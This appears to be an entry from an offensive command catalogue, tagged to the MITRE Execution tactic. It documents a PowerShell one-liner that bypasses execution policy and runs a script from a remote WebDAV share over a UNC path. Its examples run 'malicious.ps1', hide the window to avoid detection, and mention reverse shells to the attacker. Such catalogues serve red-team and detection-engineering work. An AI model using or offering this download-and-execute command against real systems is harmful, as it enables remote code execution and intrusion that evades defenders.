---
id: 3a8053cf-3396-4a12-ae53-256667f14c90
name: powershell-execute-remote-webdav-script
type: command
executor: powershell
data: >-
  powershell -ExecutionPolicy Bypass -File
  \\$_WEBDAV_SERVER\$_SHARE_PATH\$_SCRIPT_NAME.ps1
output: null
created_at: '2023-04-06T03:56:26.779943+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - powershell
  - execution
  - webdav
verified: true
validated: true
---

# powershell-execute-remote-webdav-script

## Command

```powershell
powershell -ExecutionPolicy Bypass -File \\$_WEBDAV_SERVER\$_SHARE_PATH\$_SCRIPT_NAME.ps1
```

## Description

This command invokes PowerShell to bypass execution policies and download/execute a script from a remote WebDAV server using a UNC path. It is used in initial access scenarios to run payloads without local file writes, blending with file share traffic.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_WEBDAV_SERVER | Name or IP of the WebDAV server (e.g., webdavserver.example.com) | Yes |
| $_SHARE_PATH | Path to the share/folder on the server (e.g., folder) | Yes |
| $_SCRIPT_NAME | Name of the payload script file (e.g., payload) | Yes |
| -ExecutionPolicy Bypass | Overrides PowerShell execution policy to allow unsigned scripts | Yes (built-in flag) |
| -File | Specifies the path to the script to execute | Yes (built-in flag) |

## Examples

### Basic Usage

```powershell
powershell -ExecutionPolicy Bypass -File \\webdavserver\shared\malicious.ps1
```

Executes malicious.ps1 from the shared folder on webdavserver.

### Advanced Usage

```powershell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \\192.168.1.100\docs\update.ps1
```

Runs the script hidden to avoid visual detection.

## Expected Output

The remote script (payload.ps1) loads and executes immediately. Output depends on the script content; for a simple echo payload, you might see:

PS C:\> Write-Output 'Payload executed successfully'
Payload executed successfully

If the script establishes a reverse shell, no console output but network activity to the attacker. Errors like 'File not found' or 'Access denied' indicate issues with the UNC path or permissions.

## Related

- [[procedures/Windows-Download-and-Execute-via-WebDAV]] (procedure that uses this command)
- [[tactics/Execution|TA0002 - Execution]]
